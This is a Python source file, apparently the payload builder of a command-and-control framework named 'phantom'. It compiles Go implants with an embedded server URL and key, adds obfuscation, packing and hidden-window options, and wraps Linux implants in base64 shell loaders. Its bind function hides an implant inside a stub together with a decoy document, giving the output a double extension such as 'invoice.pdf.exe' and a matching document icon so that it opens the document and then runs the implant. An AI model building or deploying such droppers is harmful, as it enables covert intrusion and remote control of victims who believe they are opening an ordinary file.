import os, re, struct, subprocess, base64, shutil, uuid
from pathlib import Path

import icons
import peicon

MAGIC = b"PHNTBINDv1______"

FLAG_WAIT = 1

SAFE_NAME = re.compile(r"[^A-Za-z0-9._-]+")


class BuildError(Exception):
    pass


class Builder:
    def __init__(self, cfg: dict, psk: str, public_url: str = ""):
        self.go = cfg.get("go_bin", "go")
        base = Path(__file__).resolve().parent
        self.implant_dir = (base / cfg["implant_dir"]).resolve()
        self.stub_dir = (base / cfg.get("stub_dir", "stub")).resolve()
        self.out = Path(cfg["output_dir"]).resolve()
        self.out.mkdir(parents=True, exist_ok=True)
        self.cache = self.out / ".cache"
        self.cache.mkdir(parents=True, exist_ok=True)
        self.loader_tpl = (base / cfg["loader_template"]).resolve()
        self.psk = psk
        self.public_url = public_url or cfg.get("public_url", "https://127.0.0.1:8443")
        self.garble = bool(cfg.get("garble", False))
        self.upx = bool(cfg.get("upx", False))
        self.max_doc = int(cfg.get("max_bind_size", 64 * 1024 * 1024))

    # ---------------- helpers ----------------

    @staticmethod
    def safe(name: str, fallback: str = "phantom") -> str:
        name = SAFE_NAME.sub("_", (name or "").strip()).strip("._-")
        return name or fallback

    def _env(self, goos: str, goarch: str) -> dict:
        return dict(os.environ, GOOS=goos, GOARCH=goarch, CGO_ENABLED="0",
                    GOTOOLCHAIN="local")

    def _compile(self, src: Path, out: Path, goos: str, goarch: str, ldflags: str):
        if self.garble and shutil.which("garble"):
            args = ["garble", "-literals", "build", "-trimpath"]
        else:
            args = [self.go, "build", "-trimpath", "-buildvcs=false"]
        args += ["-ldflags", ldflags, "-o", str(out), "."]

        # Windows endpoint protection occasionally eats the freshly linked file
        # ("Operation did not complete successfully..."); retrying clears it.
        last = ""
        for attempt in range(3):
            p = subprocess.run(args, cwd=src, env=self._env(goos, goarch),
                               capture_output=True, text=True)
            if p.returncode == 0:
                break
            last = (p.stderr or p.stdout).strip()
            if "did not complete successfully" not in last or attempt == 2:
                raise BuildError(last[:4000])
        if self.upx and shutil.which("upx") and goos != "darwin":
            subprocess.run(["upx", "--best", "--quiet", str(out)],
                           capture_output=True)
        return out

    def _ldflags(self, goos, url, psk, sleep, jitter, delay, hidden):
        flags = ["-s", "-w"]
        if hidden and goos == "windows":
            flags.append("-H windowsgui")
        flags += [
            f"-X main.serverURL={url}",
            f"-X main.pskHex={psk}",
            f"-X main.defaultSleep={sleep}",
            f"-X main.defaultJitter={jitter}",
            f"-X main.startDelay={delay}",
        ]
        return " ".join(flags)

    # ---------------- implant ----------------

    def build(self, goos="linux", goarch="amd64", url=None, psk=None, sleep=3,
              jitter=20, name="phantom", fileless=False, hidden=True, delay=0):
        url = (url or self.public_url).rstrip("/")
        psk = psk or self.psk
        name = self.safe(name)
        goos = goos if goos in ("linux", "windows", "darwin") else "linux"
        goarch = goarch if goarch in ("amd64", "arm64", "386") else "amd64"

        ext = ".exe" if goos == "windows" else ""
        outname = f"{name}-{goos}-{goarch}{ext}"
        binpath = self.out / outname

        self._compile(self.implant_dir, binpath, goos, goarch,
                      self._ldflags(goos, url, psk, int(sleep), int(jitter),
                                    int(delay), hidden))

        result = {"binary": outname, "size": binpath.stat().st_size,
                  "url": url, "os": goos, "arch": goarch, "kind": "implant"}

        if fileless and goos == "linux":
            b64 = base64.b64encode(binpath.read_bytes()).decode()
            tpl = self.loader_tpl.read_text()
            shname = f"{name}-{goos}-{goarch}.sh"
            shpath = self.out / shname
            shpath.write_text(tpl.replace("__B64__", b64))
            shpath.chmod(0o755)
            result["fileless"] = shname
        return result

    # ---------------- stub / binder ----------------

    def stub(self, goos: str, goarch: str, icon_kind: str = "") -> Path:
        if goos != "windows":
            icon_kind = ""
        tag = f"stub-{goos}-{goarch}" + (f"-{icon_kind}" if icon_kind else "")
        path = self.cache / (tag + (".exe" if goos == "windows" else ""))
        if path.exists():
            return path

        raw = self.cache / (tag + ".raw" + (".exe" if goos == "windows" else ""))
        self._compile(self.stub_dir, raw, goos, goarch,
                      self._ldflags(goos, "", "", 0, 0, 0, True))
        if goos == "windows" and icon_kind:
            try:
                path.write_bytes(peicon.inject_icon(raw.read_bytes(),
                                                    icons.build_ico(icon_kind)))
                raw.unlink(missing_ok=True)
                return path
            except Exception:
                pass
        shutil.move(str(raw), str(path))
        return path

    def bind(self, goos="windows", goarch="amd64", url=None, psk=None, sleep=3,
             jitter=20, name="invoice", doc_name="document.pdf", doc=b"",
             hidden=True, delay=0, double_ext=True, icon=True):
        if not doc:
            raise BuildError("no document supplied")
        if len(doc) > self.max_doc:
            raise BuildError(f"document too large (max {self.max_doc // (1024 * 1024)} MB)")

        url = (url or self.public_url).rstrip("/")
        psk = psk or self.psk
        stem = self.safe(Path(name).stem if name else "", "document")
        doc_name = self.safe(Path(doc_name or "document.pdf").name, "document.pdf")
        if "." not in doc_name:
            doc_name += ".pdf"

        goos = goos if goos in ("linux", "windows", "darwin") else "windows"
        goarch = goarch if goarch in ("amd64", "arm64", "386") else "amd64"

        tmp = self.cache / f"imp-{os.getpid()}-{uuid.uuid4().hex[:8]}"
        try:
            self._compile(self.implant_dir, tmp, goos, goarch,
                          self._ldflags(goos, url, psk, int(sleep), int(jitter),
                                        int(delay), hidden))
            implant = tmp.read_bytes()
        finally:
            tmp.unlink(missing_ok=True)

        kind = icons.kind_for(doc_name) if icon else ""
        stub = self.stub(goos, goarch, kind)
        stub_bytes = stub.read_bytes()

        name_b = doc_name.encode("utf-8")[:200]
        footer = struct.pack("<IIIII", len(implant), len(doc), len(name_b),
                             FLAG_WAIT, 0) + MAGIC
        blob = stub_bytes + implant + doc + name_b + footer

        ext = Path(doc_name).suffix
        if goos == "windows":
            outname = f"{stem}{ext}.exe" if double_ext else f"{stem}.exe"
        else:
            outname = f"{stem}{ext}.run"
        outpath = self.out / outname
        outpath.write_bytes(blob)
        outpath.chmod(0o755)

        return {"binary": outname, "size": outpath.stat().st_size, "url": url,
                "os": goos, "arch": goarch, "kind": "bound",
                "carries": doc_name, "icon": kind or "none",
                "note": "opens the document, then runs the implant"}

    # ---------------- artifacts ----------------

    def list_builds(self):
        items = []
        for f in sorted(self.out.iterdir()):
            if f.is_file() and not f.name.startswith("."):
                items.append({"name": f.name, "size": f.stat().st_size,
                              "mtime": f.stat().st_mtime})
        return items

